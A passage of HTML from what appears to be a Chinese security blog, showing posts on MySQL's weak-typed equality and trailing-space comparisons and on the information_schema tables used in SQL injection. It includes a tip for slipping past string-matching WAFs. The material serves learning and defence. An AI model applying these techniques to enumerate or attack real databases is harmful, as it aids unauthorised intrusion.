class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> debian<span class="operator">-</span>sys<span class="operator">-</span>maint <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/web-sec/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%20WHO%20ARE%20YOU_%20Write-Up%20.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/sqli/MySQL%E6%9D%A1%E4%BB%B6%E7%AD%89%E5%8F%B7%E7%9A%84%E5%BC%82%E5%B8%B8.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/sqli/MySQL%E6%9D%A1%E4%BB%B6%E7%AD%89%E5%8F%B7%E7%9A%84%E5%BC%82%E5%B8%B8.html" class="post-title-link" itemprop="url">MySQL条件等号的异常</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-10-17 13:00:00" itemprop="dateCreated datePublished" datetime="2017-10-17T13:00:00+08:00">2017-10-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/sqli/" itemprop="url" rel="index"><span itemprop="name">sqli</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>敬原作者（应该是原作者，如有错误，请指正）<br><a target="_blank" rel="noopener" href="http://www.wupco.cn/?p=93" title="来自Wupco&#39;s Blog">来自Wupco’s Blog</a></p>
+</blockquote>
+<p>##根源<br>MySQL WHERE语句中，等号<code>=</code>通常作为判断条件，然而这个等号却是<code>弱类型</code>的判断，如果忽略了这一点，很容易造成安全问题，以下是原作者整理的匪夷所思的<code>相等</code>。</p>
+<p>##字符型和数字型<br>MySQL的等号同PHP一样，对等号两端不同的数据类型都有强制类型转换，如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use mysql</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> name <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> name             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> debian<span class="operator">-</span>sys<span class="operator">-</span>maint <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>但却没有PHP的弱类型判断（<strong>此处本人不明白，为什么以下语句能说明这句话，望大神指点</strong>）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> name <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="number">0.99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>这个的应用范围很局限，但是又不得忽视，所以开发者在字段的数据类型的选择以及SQL语句的构造方面，要多多注意，防止等号两边类型不相同导致的漏洞。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> name <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="string">&#x27;1d&#x27;</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> name             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> debian<span class="operator">-</span>sys<span class="operator">-</span>maint <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/a48c6f66869841123aefa80a9fcd1a231ee6d904.png" alt="这个我在本地实验没成功"></p>
+<p>##尾空格<br>MySQL等号对字符尾部的空格做忽视的处理，所以我们可以构造一个<code>&#39;abc&#39;=&#39;abc [space]</code>的效果，绕过某些特定串整体检查的<code>WAF</code>，不过相对来说，这个也比较鸡肋，因为很少有用的字符串直接对比来过滤某些敏感串的，直接用<code>trim</code>函数来避免。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/sqli/MySQL%E6%9D%A1%E4%BB%B6%E7%AD%89%E5%8F%B7%E7%9A%84%E5%BC%82%E5%B8%B8.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/sqli/MySQL%E4%B8%AD%E7%9A%84Information_schema%E4%BB%8B%E7%BB%8D.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/sqli/MySQL%E4%B8%AD%E7%9A%84Information_schema%E4%BB%8B%E7%BB%8D.html" class="post-title-link" itemprop="url">MySQL中的Information_schema介绍</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-10-17 11:12:00" itemprop="dateCreated datePublished" datetime="2017-10-17T11:12:00+08:00">2017-10-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/sqli/" itemprop="url" rel="index"><span itemprop="name">sqli</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]<br>##介绍<br><code>information_schema</code>数据库是在<code>mysql&gt;5.0</code>版本之后产生的一个虚拟数据库，物理上并不存在。<br>information_schema数据库类似于“数据字典”，提供了访问数据库元数据的方式，即数据的数据。比如数据库名或表名、列类型、访问权限（更细化的访问方式）。<br>##<code>information_schema</code>所有数据表一揽</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use information_schema;</span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_information_schema          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> CHARACTER_SETS                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLLATIONS                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLLATION_CHARACTER_SET_APPLICABILITY <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMNS                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_PRIVILEGES                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ENGINES                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> EVENTS                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FILES                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> GLOBAL_STATUS                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> GLOBAL_VARIABLES                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KEY_COLUMN_USAGE                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> OPTIMIZER_TRACE                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PARAMETERS                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PARTITIONS                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PLUGINS                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PROCESSLIST                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PROFILING                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> REFERENTIAL_CONSTRAINTS               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ROUTINES                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCHEMATA                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCHEMA_PRIVILEGES                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SESSION_STATUS                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SESSION_VARIABLES                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> STATISTICS                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLES                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLESPACES                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_CONSTRAINTS                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_PRIVILEGES                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TRIGGERS                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> USER_PRIVILEGES                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> VIEWS                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_LOCKS                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_TRX                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_DATAFILES                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_LOCK_WAITS                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_TABLESTATS                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_METRICS                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP_RESET                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP_PER_INDEX                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMPMEM_RESET                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_DELETED                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_BUFFER_PAGE_LRU                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_FOREIGN                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_COLUMNS                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_INDEXES                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_DEFAULT_STOPWORD            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_FIELDS                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP_PER_INDEX_RESET            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_BUFFER_PAGE                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMPMEM                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_INDEX_TABLE                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_BEING_DELETED               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_TABLESPACES                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_INDEX_CACHE                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_FOREIGN_COLS               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_TABLES                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_BUFFER_POOL_STATS              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_CONFIG                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="number">59</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>共有59张表，但是我们在SQL注入过程中，主要用到其中7张表，最重要的是<code>SCHEMA</code>，<code>TABLES</code>，<code>COLUMNS</code>这三张表。<br>##重要表结构<br>###SCHEMATA表<br><code>information_schema.SCHEMATA</code>表提供了当前mysql实例中所有<code>数据库</code>的信息。是<code>show databases</code>的结果。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME        <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> information_schema <span class="operator">|</span> utf8                       <span class="operator">|</span> utf8_general_ci        <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> mysql              <span class="operator">|</span> latin1                     <span class="operator">|</span> latin1_swedish_ci      <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> performance_schema <span class="operator">|</span> utf8                       <span class="operator">|</span> utf8_general_ci        <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> test               <span class="operator">|</span> latin1                     <span class="operator">|</span> latin1_swedish_ci      <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> test               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>###TABLES表<br><code>information_schema.TABLES</code>表提供了关于数据库中的<code>表</code>的信息（包括视图）。是<code>show tables from [schemaname]</code>的结果。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> information_schema.tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field           <span class="operator">|</span> Type                <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CATALOG   <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">512</span>)        <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_SCHEMA    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_NAME      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_TYPE      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ENGINE          <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> VERSION         <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ROW_FORMAT      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_ROWS      <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AVG_ROW_LENGTH  <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> DATA_LENGTH     <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MAX_DATA_LENGTH <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INDEX_LENGTH    <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> DATA_FREE       <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AUTO_INCREMENT  <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CREATE_TIME     <span class="operator">|</span> datetime            <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> UPDATE_TIME     <span class="operator">|</span> datetime            <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHECK_TIME      <span class="operator">|</span> datetime            <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_COLLATION <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">32</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHECKSUM        <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CREATE_OPTIONS  <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">255</span>)        <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_COMMENT   <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">2048</span>)       <span class="operator">|</span> <span 